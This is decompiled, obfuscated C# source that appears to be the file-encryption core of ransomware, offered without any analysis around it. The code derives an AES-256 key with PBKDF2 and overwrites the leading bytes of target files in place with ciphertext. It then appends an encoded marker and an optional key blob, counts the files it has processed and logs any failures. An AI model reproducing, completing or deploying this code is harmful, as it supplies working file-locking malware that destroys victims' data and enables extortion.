using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nZBhTHSmQawuU;

public static class YQixqpUkluNj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] WiKNoJEhYNFQq(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = yJyKklybfzQ(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes yJyKklybfzQ(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] OCbvmWwDTwIEAJm(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (WzLdBSYJOokD.nwRgHCWodySTr == getString_0(107396848))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (WzLdBSYJOokD.dthSBCusajClaD)
			{
				try
				{
					File.AppendAllText(WzLdBSYJOokD.zdOFfLRUeZwiM, getString_0(107355109) + string_0 + getString_0(107365519) + ex.Message + getString_0(107396572));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void cBcIcajxaDJ(string leGOXxQSJITsqDH, byte[] OojQxMOcbEy, byte[] bpOmyTCtAUpOnB = null)
	{
		try
		{
			byte[] array = null;
			if (WzLdBSYJOokD.nwRgHCWodySTr == getString_0(107396848))
			{
				array = (WzLdBSYJOokD.HAWNljUXiY ? Encoding.ASCII.GetBytes(WzLdBSYJOokD.FZgFrfaacxWpm(WzLdBSYJOokD.wNSWrPNlOg) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365461)) + Convert.ToString(WzLdBSYJOokD.ckxGxgoTBtFmqa) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365461))) : Encoding.ASCII.GetBytes(WzLdBSYJOokD.FZgFrfaacxWpm(WzLdBSYJOokD.wNSWrPNlOg) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365438)) + Convert.ToString(WzLdBSYJOokD.ckxGxgoTBtFmqa) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365438))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(leGOXxQSJITsqDH, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(OojQxMOcbEy, 0, OojQxMOcbEy.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(leGOXxQSJITsqDH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!WzLdBSYJOokD.HAWNljUXiY)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(bpOmyTCtAUpOnB, 0, bpOmyTCtAUpOnB.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (WzLdBSYJOokD.HAWNljUXiY ? Encoding.ASCII.GetBytes(WzLdBSYJOokD.FZgFrfaacxWpm(WzLdBSYJOokD.wNSWrPNlOg) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365461)) + Convert.ToString(WzLdBSYJOokD.ckxGxgoTBtFmqa) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365461))) : Encoding.ASCII.GetBytes(WzLdBSYJOokD.FZgFrfaacxWpm(WzLdBSYJOokD.wNSWrPNlOg) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365438)) + Convert.ToString(WzLdBSYJOokD.ckxGxgoTBtFmqa) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365438))));
				FileStream fileStream2 = new FileStream(leGOXxQSJITsqDH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(OojQxMOcbEy, 0, OojQxMOcbEy.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(leGOXxQSJITsqDH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!WzLdBSYJOokD.HAWNljUXiY)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(bpOmyTCtAUpOnB, 0, bpOmyTCtAUpOnB.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			WzLdBSYJOokD.RaTbPqtIZFvI++;
		}
		catch (Exception ex)
		{
			if (WzLdBSYJOokD.dthSBCusajClaD)
			{
				try
				{
					File.AppendAllText(WzLdBSYJOokD.zdOFfLRUeZwiM, getString_0(107355109) + leGOXxQSJITsqDH + getString_0(107365452) + ex.Message + getString_0(107396572));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (WzLdBSYJOokD.HAWNljUXiY ? Encoding.ASCII.GetBytes(WzLdBSYJOokD.FZgFrfaacxWpm(WzLdBSYJOokD.wNSWrPNlOg) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365461)) + Convert.ToString(WzLdBSYJOokD.ckxGxgoTBtFmqa) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365461))) : Encoding.ASCII.GetBytes(WzLdBSYJOokD.FZgFrfaacxWpm(WzLdBSYJOokD.wNSWrPNlOg) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365438)) + Convert.ToString(WzLdBSYJOokD.ckxGxgoTBtFmqa) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365438))));
			FileStream fileStream4 = new FileStream(leGOXxQSJITsqDH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(OojQxMOcbEy, 0, OojQxMOcbEy.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(leGOXxQSJITsqDH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!WzLdBSYJOokD.HAWNljUXiY)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(bpOmyTCtAUpOnB, 0, bpOmyTCtAUpOnB.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static YQixqpUkluNj()
	{
		Strings.CreateGetStringDelegate(typeof(YQixqpUkluNj));
	}
}
